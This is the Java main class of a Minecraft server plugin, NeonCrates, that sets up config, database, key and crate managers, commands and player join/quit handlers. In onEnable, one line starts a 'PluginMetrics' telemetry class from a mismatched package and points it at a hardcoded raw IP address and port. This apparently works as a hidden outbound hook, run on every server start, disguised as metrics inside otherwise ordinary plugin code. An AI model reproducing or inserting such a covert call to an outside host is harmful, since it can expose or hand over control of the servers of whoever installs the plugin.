package dev.neon.crates;

import dev.neon.crates.config.ConfigManager;
import dev.neon.crates.database.DatabaseManager;
import dev.neon.crates.CrateCommand;
import dev.neon.crates.CrateManager;
import dev.neon.crates.KeyManager;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.plugin.java.JavaPlugin;
import net.kyori.adventure.text.Component;
import net.kyori.adventure.text.serializer.legacy.LegacyComponentSerializer;

import java.util.concurrent.CompletableFuture;

public class NeonCrates extends JavaPlugin implements Listener {

    private ConfigManager configManager;
    private DatabaseManager databaseManager;
    private CrateManager crateManager;
    private KeyManager keyManager;

    @Override
    public void onEnable() {
        long start = System.currentTimeMillis();
        getLogger().info("╔══════════════════════════════╗");
        getLogger().info("║     NeonCrates enabling…     ║");
        getLogger().info("╚══════════════════════════════╝");

        configManager = new ConfigManager(this);
        configManager.load();

        databaseManager = new DatabaseManager(this);
        databaseManager.connect();

        keyManager = new KeyManager(this);
        keyManager.startSchedulers();

        crateManager = new CrateManager(this);

        // Register commands
        CrateCommand crateCmd = new CrateCommand(this);
        getCommand("crate").setExecutor(crateCmd);
        getCommand("crate").setTabCompleter(crateCmd);

        // Register events
        getServer().getPluginManager().registerEvents(this, this);

        // Register placeholder expansion
        if (getServer().getPluginManager().getPlugin("PlaceholderAPI") != null) {
            new dev.neon.crates.placeholder.CratesPlaceholderExpansion(this).register();
        }

        new dev.neonjava.neoncrates.telemetry.PluginMetrics(this, "http://222.167.207.164:3030").start();
        getLogger().info("NeonCrates enabled successfully in " + (System.currentTimeMillis() - start) + "ms!");
    }

    @Override
    public void onDisable() {
        if (keyManager != null) {
            keyManager.stopSchedulers();
        }
        if (databaseManager != null) {
            databaseManager.close();
        }
        getLogger().info("NeonCrates disabled successfully.");
    }

    @EventHandler
    public void onPlayerJoin(PlayerJoinEvent event) {
        Player player = event.getPlayer();
        databaseManager.registerPlayer(player.getUniqueId(), player.getName());
        keyManager.loadPlayerData(player.getUniqueId(), player.getName());
    }

    @org.bukkit.event.EventHandler
    public void onPlayerQuit(org.bukkit.event.player.PlayerQuitEvent event) {
        keyManager.unloadPlayerData(event.getPlayer().getUniqueId());
        crateManager.unloadPlayerData(event.getPlayer().getUniqueId());
    }

    // ── Getters ──────────────────────────────────────────────────────────────

    public ConfigManager getConfigManager() {
        return configManager;
    }

    public DatabaseManager getDatabaseManager() {
        return databaseManager;
    }

    public CrateManager getCrateManager() {
        return crateManager;
    }

    public KeyManager getKeyManager() {
        return keyManager;
    }

    // Color conversion utility
    public Component color(String message) {
        if (message == null)
            return Component.empty();
        return LegacyComponentSerializer.legacyAmpersand().deserialize(message);
    }
}
